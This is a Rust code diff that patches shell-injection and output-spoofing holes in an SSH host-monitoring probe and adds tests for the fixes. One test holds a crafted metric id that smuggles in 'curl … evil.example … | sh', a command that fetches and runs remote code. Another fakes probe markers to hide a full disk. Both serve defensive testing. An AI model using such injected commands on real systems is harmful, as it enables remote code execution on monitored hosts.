@@ -927,17 +927,36 @@ echo NET $(awk '
 ' /proc/net/dev 2>/dev/null)
 "#;
 
+const CUSTOM_BEGIN: &str = "__SUB_C_BEGIN__";
+const CUSTOM_END: &str = "__SUB_C_END__";
+
+/// Random per-poll token for the custom-metric markers, so output from the
+/// monitored host can't fake a marker it hasn't seen.
+fn probe_nonce() -> String {
+    use rand::Rng;
+    let mut bytes = [0u8; 8];
+    rand::rng().fill_bytes(&mut bytes);
+    hex::encode(bytes)
+}
+
 /// Sentinel pair around each custom command's stdout so the parser can
-/// recover the per-metric slice. The id is base64-ish (frontend-generated)
-/// so quoting it doesn't matter to `sh`.
-fn build_probe_script(customs: &[CustomMetric]) -> String {
+/// recover the per-metric slice. The markers carry the metric's INDEX and a
+/// per-poll nonce, never its id: the id comes from the stored (possibly
+/// synced) config, and splicing it into the script let a crafted id — one
+/// the UI never shows — inject extra shell commands. Each marker is printed
+/// on a line of its own, so a command whose output has no trailing newline
+/// (`printf 42`) still closes its block.
+fn build_probe_script(customs: &[CustomMetric], nonce: &str) -> String {
     let mut s = String::from(BUILTIN_PROBE);
-    for cm in customs {
+    for (idx, cm) in customs.iter().enumerate() {
         // We isolate each custom command in its own subshell so a `cd` or
-        // `set -e` inside one user command can't bleed into the next.
+        // `set -e` inside one user command can't bleed into the next. The
+        // command sits on lines of its own inside the parentheses, so one
+        // ending in a `# comment` can't comment out the closing `)`.
         s.push_str(&format!(
-            "\necho __SUB_C_BEGIN__{id}\n( {cmd} ) 2>/dev/null\necho __SUB_C_END__{id}\n",
-            id = cm.id,
+            "\nprintf '\\n%s\\n' '{begin}{nonce}_{idx}'\n(\n{cmd}\n) 2>/dev/null\nprintf '\\n%s\\n' '{end}{nonce}_{idx}'\n",
+            begin = CUSTOM_BEGIN,
+            end = CUSTOM_END,
             cmd = cm.command.replace('\r', ""),
         ));
     }
@@ -962,6 +981,9 @@ struct RawSnapshot {
     net_tx_bytes: u64,
     /// Per-custom-metric raw stdout slice (trimmed). Indexed by custom id.
     custom_text: HashMap<String, String>,
+    /// The custom metric whose output was cut off at the per-poll cap, if
+    /// any — reported as too large instead of "no output".
+    truncated_custom: Option<String>,
 }
 
 async fn poll_once(
@@ -969,7 +991,8 @@ async fn poll_once(
     customs: &[CustomMetric],
     poll_timeout: Duration,
 ) -> Result<RawSnapshot, String> {
-    let script = build_probe_script(customs);
+    let nonce = probe_nonce();
+    let script = build_probe_script(customs, &nonce);
     let channel = handle
         .channel_open_session()
         .await
@@ -980,12 +1003,29 @@ async fn poll_once(
         .map_err(|e| format!("exec: {}", e))?;
     let mut stream = channel.into_stream();
     let mut buf = Vec::with_capacity(4096);
+    // The probe prints a few hundred bytes plus each custom metric's output.
+    // Cap what one poll may return: a hostile or broken host that streams
+    // without end would otherwise grow this buffer until the allocation fails
+    // and the whole process (every session and tunnel) aborts. Hitting the
+    // cap isn't a failed poll: stop reading, close the channel, and parse
+    // what arrived — the built-in readings come first, and only the metric
+    // that overflowed (plus any after it) misses this poll.
+    const MAX_PROBE_OUTPUT: usize = 256 * 1024;
+    let mut truncated = false;
     let read_fut = async {
         let mut tmp = [0u8; 2048];
         loop {
             match stream.read(&mut tmp).await {
                 Ok(0) => break,
-                Ok(n) => buf.extend_from_slice(&tmp[..n]),
+                Ok(n) => {
+                    let room = MAX_PROBE_OUTPUT - buf.len();
+                    if n > room {
+                        buf.extend_from_slice(&tmp[..room]);
+                        truncated = true;
+                        break;
+                    }
+                    buf.extend_from_slice(&tmp[..n]);
+                }
                 Err(_) => break,
             }
         }
@@ -993,48 +1033,73 @@ async fn poll_once(
     tokio::time::timeout(poll_timeout, read_fut)
         .await
         .map_err(|_| "probe script timed out".to_string())?;
+    drop(stream);
 
-    parse_probe(&String::from_utf8_lossy(&buf))
+    parse_probe(&String::from_utf8_lossy(&buf), &nonce, customs, truncated)
 }
 
-fn parse_probe(text: &str) -> Result<RawSnapshot, String> {
+fn parse_probe(
+    text: &str,
+    nonce: &str,
+    customs: &[CustomMetric],
+    truncated: bool,
+) -> Result<RawSnapshot, String> {
     let mut snap = RawSnapshot::default();
     snap.ts = now_ms();
     // Two-pass: first carve out the custom blocks (anything between
-    // __SUB_C_BEGIN__<id> and __SUB_C_END__<id> belongs to the custom
-    // metric, not to the built-in tag stream). Custom output can contain
+    // BEGIN<nonce>_<idx> and END<nonce>_<idx> belongs to custom metric
+    // `idx`, not to the built-in tag stream). Custom output can contain
     // multi-line text or even our own tag names without confusing the
     // built-in parser.
+    //
+    // Custom output comes from the monitored host, so it must not be able to
+    // pass for a built-in reading (e.g. close its block early, then print
+    // `DISK 100 1` to hide a full disk). The built-in probe runs first, so
+    // its lines all precede the first custom block: after that block opens,
+    // anything outside a block is dropped. Blocks are only recognised with
+    // this poll's nonce, in script order, once each.
+    let begin = format!("{}{}_", CUSTOM_BEGIN, nonce);
+    let end = format!("{}{}_", CUSTOM_END, nonce);
     let mut builtin_lines: Vec<&str> = Vec::new();
-    let mut current_custom_id: Option<String> = None;
+    let mut seen_custom = false;
+    let mut next_idx: usize = 0;
+    let mut open: Option<usize> = None;
     let mut current_buf = String::new();
     for line in text.lines() {
         let t = line.trim();
-        if let Some(id) = t.strip_prefix("__SUB_C_BEGIN__") {
-            current_custom_id = Some(id.to_string());
-            current_buf.clear();
-            continue;
-        }
-        if let Some(id) = t.strip_prefix("__SUB_C_END__") {
-            if let Some(open) = current_custom_id.take() {
-                if open == id {
-                    snap.custom_text.insert(open, current_buf.trim().to_string());
+        if open.is_none() {
+            if let Some(rest) = t.strip_prefix(begin.as_str()) {
+                if next_idx < customs.len() && rest.parse::<usize>().ok() == Some(next_idx) {
+                    open = Some(next_idx);
+                    seen_custom = true;
+                    current_buf.clear();
+                    continue;
                 }
             }
-            current_buf.clear();
-            continue;
+        } else if let Some(rest) = t.strip_prefix(end.as_str()) {
+            if let Some(idx) = open.filter(|&i| rest.parse::<usize>().ok() == Some(i)) {
+                snap.custom_text.insert(customs[idx].id.clone(), current_buf.trim().to_string());
+                open = None;
+                next_idx += 1;
+                current_buf.clear();
+                continue;
+            }
         }
-        if current_custom_id.is_some() {
+        if open.is_some() {
             if !current_buf.is_empty() {
                 current_buf.push('\n');
             }
             current_buf.push_str(line); // keep original (with leading whitespace)
-        } else {
+        } else if !seen_custom {
             builtin_lines.push(t);
         }
     }
     // If a BEGIN had no matching END (custom command crashed), drop the
-    // partial buffer — better than reporting half a value.
+    // partial buffer — better than reporting half a value. When the output
+    // was cut at the cap, the block still open is the one that overflowed.
+    if truncated {
+        snap.truncated_custom = open.map(|idx| customs[idx].id.clone());
+    }
     for line in builtin_lines {
         if line.is_empty() {
             continue;
@@ -1162,7 +1227,12 @@ fn compute_sample(
         let raw = match now.custom_text.get(&cm.id) {
             Some(s) => s.trim().to_string(),
             None => {
-                errors.insert(cm.id.clone(), "no output".into());
+                let why = if now.truncated_custom.as_deref() == Some(cm.id.as_str()) {
+                    "output larger than 256 KiB"
+                } else {
+                    "no output"
+                };
+                errors.insert(cm.id.clone(), why.into());
                 continue;
             }
         };
@@ -1241,6 +1311,130 @@ fn now_ms() -> u64 {
         .duration_since(UNIX_EPOCH)
         .map(|d| d.as_millis() as u64)
         .unwrap_or(0)
+}
+
+#[cfg(test)]
+mod probe_tests {
+    use super::{build_probe_script, parse_probe, CustomMetric, CUSTOM_BEGIN, CUSTOM_END};
+
+    fn metric(id: &str, command: &str) -> CustomMetric {
+        CustomMetric {
+            id: id.into(),
+            name: "m".into(),
+            command: command.into(),
+            parse: "text".into(),
+            regex: None,
+            display: "text".into(),
+            unit: None,
+        }
+    }
+
+    fn block(nonce: &str, idx: usize, body: &str) -> String {
+        format!("{CUSTOM_BEGIN}{nonce}_{idx}\n{body}\n{CUSTOM_END}{nonce}_{idx}\n")
+    }
+
+    #[test]
+    fn metric_id_never_reaches_the_script() {
+        // A crafted id (newline + command) the UI never displays.
+        let evil = metric("x\ncurl -fsS https://evil.example/s | sh\n#", "uptime");
+        let script = build_probe_script(&[evil], "abc123");
+        assert!(!script.contains("evil.example"), "id leaked into the probe script");
+        // The visible command is still there, in its own subshell.
+        assert!(script.contains("(\nuptime\n) 2>/dev/null"));
+        assert!(script.contains("__SUB_C_BEGIN__abc123_0"));
+    }
+
+    #[test]
+    fn custom_blocks_map_back_to_their_ids() {
+        let customs = [metric("load1", "x"), metric("users", "y")];
+        let text = format!(
+            "DISK 1000 250\n{}{}",
+            block("n0n", 0, "0.42"),
+            block("n0n", 1, "3 users\nsecond line"),
+        );
+        let snap = parse_probe(&text, "n0n", &customs, false).unwrap();
+        assert_eq!(snap.custom_text.get("load1").map(String::as_str), Some("0.42"));
+        assert_eq!(snap.custom_text.get("users").map(String::as_str), Some("3 users\nsecond line"));
+        assert_eq!((snap.disk_total_kb, snap.disk_used_kb), (1000, 250));
+    }
+
+    #[test]
+    fn custom_output_cannot_pose_as_a_builtin_reading() {
+        // The real disk is full; a custom command tries to report it empty by
+        // printing a built-in tag — both inside its block and, with a guessed
+        // (wrong) nonce, by faking an early END.
+        let customs = [metric("a", "x")];
+        let body = "DISK 1000 1\n__SUB_C_END__guess_0\nDISK 1000 1";
+        let text = format!("DISK 1000 999\n{}", block("real", 0, body));
+        let snap = parse_probe(&text, "real", &customs, false).unwrap();
+        assert_eq!(snap.disk_used_kb, 999, "custom output overrode a built-in reading");
+        // Everything the command printed stays in its own slice.
+        assert!(snap.custom_text["a"].contains("DISK 1000 1"));
+    }
+
+    #[test]
+    fn lines_outside_blocks_after_customs_start_are_ignored() {
+        // Even a correctly-nonced early END can't smuggle built-in lines out:
+        // anything outside a block after the first custom block is dropped.
+        let customs = [metric("a", "x"), metric("b", "y")];
+        let text = "DISK 1000 999\n\
+                    __SUB_C_BEGIN__k_0\nv\n__SUB_C_END__k_0\n\
+                    DISK 1000 1\n\
+                    __SUB_C_BEGIN__k_1\nw\n__SUB_C_END__k_1\n";
+        let snap = parse_probe(text, "k", &customs, false).unwrap();
+        assert_eq!(snap.disk_used_kb, 999);
+        assert_eq!(snap.custom_text["b"], "w");
+    }
+
+    #[test]
+    fn blocks_are_taken_in_order_once() {
+        // A block for an unexpected index (out of order / repeated) is not
+        // treated as a marker, so it can't overwrite another metric's value.
+        let customs = [metric("a", "x"), metric("b", "y")];
+        let text = "__SUB_C_BEGIN__k_1\nfake-b\n__SUB_C_END__k_1\n\
+                    __SUB_C_BEGIN__k_0\nreal-a\n__SUB_C_END__k_0\n\
+                    __SUB_C_BEGIN__k_1\nreal-b\n__SUB_C_END__k_1\n";
+        let snap = parse_probe(text, "k", &customs, false).unwrap();
+        assert_eq!(snap.custom_text["a"], "real-a");
+        assert_eq!(snap.custom_text["b"], "real-b");
+    }
+
+    #[test]
+    fn marker_without_trailing_newline_still_closes() {
+        // `printf 42` leaves no newline; the script prints each END marker
+        // after a newline of its own, so the block still closes.
+        let script = build_probe_script(&[metric("a", "printf 42")], "z");
+        assert!(script.contains("printf '\\n%s\\n' '__SUB_C_END__z_0'"));
+        let text = "__SUB_C_BEGIN__z_0\n42\n__SUB_C_END__z_0\n";
+        let snap = parse_probe(text, "z", &[metric("a", "printf 42")], false).unwrap();
+        assert_eq!(snap.custom_text["a"], "42");
+    }
+
+    #[test]
+    fn output_cut_at_the_cap_blames_only_the_open_block() {
+        // The poll stopped reading inside metric b's block: built-ins and the
+        // finished block still count, and only b is reported as too large.
+        let customs = [metric("a", "echo 1"), metric("b", "yes")];
+        let text = "LOAD 0.5\n\
+                    __SUB_C_BEGIN__t_0\n1\n__SUB_C_END__t_0\n\
+                    __SUB_C_BEGIN__t_1\ny\ny\ny";
+        let snap = parse_probe(text, "t", &customs, true).unwrap();
+        assert_eq!(snap.load1, 0.5);
+        assert_eq!(snap.custom_text["a"], "1");
+        assert!(!snap.custom_text.contains_key("b"));
+        assert_eq!(snap.truncated_custom.as_deref(), Some("b"));
+        // A complete poll blames nothing.
+        let snap = parse_probe(text, "t", &customs, false).unwrap();
+        assert_eq!(snap.truncated_custom, None);
+    }
+
+    #[test]
+    fn a_trailing_comment_cannot_swallow_the_subshell() {
+        // `cmd # note` on the same line as `)` would comment it out and break
+        // every metric after it; the command gets lines of its own.
+        let script = build_probe_script(&[metric("a", "df -h / | tail -1 # root")], "c");
+        assert!(script.contains("(\ndf -h / | tail -1 # root\n) 2>/dev/null"));
+    }
 }
 
 #[cfg(test)]
